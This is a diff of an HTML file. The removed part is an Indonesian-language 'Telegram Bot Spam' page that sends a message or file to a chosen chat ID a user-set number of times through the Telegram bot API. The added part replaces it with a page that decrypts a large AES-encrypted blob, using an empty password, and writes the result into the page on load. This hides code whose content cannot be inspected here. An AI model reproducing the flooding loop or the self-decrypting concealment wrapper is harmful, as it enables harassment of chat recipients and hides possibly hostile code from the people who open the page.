@@ -1,192 +1,32 @@
-<!DOCTYPE html>
-<html lang="id">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Bot Sender</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #333;
-        }
-        .container {
-            background: #fff;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-        }
-        h1 {
-            margin-bottom: 30px;
-            color: #667eea;
-            font-size: 2.5em;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
-        }
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #555;
-        }
-        input[type="text"], input[type="number"], textarea, input[type="file"] {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        input[type="text"]:focus, input[type="number"]:focus, textarea:focus, input[type="file"]:focus {
-            border-color: #667eea;
-            outline: none;
-        }
-        textarea {
-            resize: vertical;
-            min-height: 100px;
-        }
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: #fff;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 8px;
-            font-size: 18px;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            width: 100%;
-        }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        .status {
-            margin-top: 20px;
-            font-weight: bold;
-        }
-        .success {
-            color: #28a745;
-        }
-        .error {
-            color: #dc3545;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>Encrypted HTML</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Telegram Bot Spam</h1>
-        <form id="telegramForm">
-            <div class="form-group">
-                <label for="botToken">Bot Token:</label>
-                <input type="text" id="botToken" placeholder="Masukkan token bot Telegram" required>
-            </div>
-            <div class="form-group">
-                <label for="messageText">Teks:</label>
-                <textarea id="messageText" placeholder="Masukkan teks pesan"></textarea>
-            </div>
-            <div class="form-group">
-                <label for="fileInput">Tambah file/foto jika mau:</label>
-                <input type="file" id="fileInput" accept="image/*, .pdf, .doc, .docx, .txt">
-            </div>
-            <div class="form-group">
-                <label for="chatId">Chat ID:</label>
-                <input type="text" id="chatId" placeholder="Masukkan Chat ID" required>
-            </div>
-            <div class="form-group">
-                <label for="sendCount">Jumlah Kirim:</label>
-                <input type="number" id="sendCount" min="1" value="1" required>
-            </div>
-            <button type="submit">Kirim</button>
-        </form>
-        <div id="status" class="status"></div>
-    </div>
 
-    <script>
-        document.getElementById('telegramForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
-            
-            const botToken = document.getElementById('botToken').value;
-            const messageText = document.getElementById('messageText').value;
-            const fileInput = document.getElementById('fileInput');
-            const chatId = document.getElementById('chatId').value;
-            const sendCount = parseInt(document.getElementById('sendCount').value);
-            const statusDiv = document.getElementById('status');
-            
-            statusDiv.textContent = '';
-            statusDiv.className = 'status';
-            
-            if (!botToken || !chatId) {
-                statusDiv.textContent = 'Bot Token dan Chat ID wajib diisi!';
-                statusDiv.classList.add('error');
-                return;
-            }
-            
-            if (!messageText && !fileInput.files[0]) {
-                statusDiv.textContent = 'Harus ada teks atau file untuk dikirim!';
-                statusDiv.classList.add('error');
-                return;
-            }
-            
-            const apiUrl = `https://api.telegram.org/bot${botToken}`;
-            
-            for (let i = 0; i < sendCount; i++) {
-                try {
-                    if (fileInput.files[0]) {
-                        // Kirim file/foto
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', fileInput.files[0]); // Asumsi foto, bisa diganti dengan document jika perlu
-                        if (messageText) {
-                            formData.append('caption', messageText);
-                        }
-                        
-                        const response = await fetch(`${apiUrl}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                        if (!response.ok) {
-                            throw new Error(`HTTP error! status: ${response.status}`);
-                        }
-                    } else {
-                        // Kirim teks
-                        const response = await fetch(`${apiUrl}/sendMessage`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: messageText
-                            })
-                        });
-                        
-                        if (!response.ok) {
-                            throw new Error(`HTTP error! status: ${response.status}`);
-                        }
-                    }
-                    
-                    statusDiv.textContent = `Pesan ${i + 1} dari ${sendCount} berhasil dikirim!`;
-                    statusDiv.classList.add('success');
-                } catch (error) {
-                    statusDiv.textContent = `Gagal mengirim pesan ${i + 1}: ${error.message}`;
-                    statusDiv.classList.add('error');
-                    break; // Stop jika ada error
-                }
-            }
-        });
-    </script>
+  <!-- CryptoJS CDN -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <script>
+    (function(){
+      try {
+        var ciphertext = "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";
+        var pass = '';
+        if (false && pass === null) {
+          document.getElementById('status').innerText = 'Decrypt dibatalkan.';
+          return;
+        }
+        var bytes = CryptoJS.AES.decrypt(ciphertext, pass || '');
+        var original = bytes.toString(CryptoJS.enc.Utf8);
+        if (!original) throw new Error('Password salah atau isi rusak.');
+        document.open();
+        document.write(original);
+        document.close();
+      } catch (e) {
+        document.getElementById('status').innerText = 'Gagal membuka halaman: ' + e.message;
+      }
+    })();
+  </script>
 </body>
 </html>
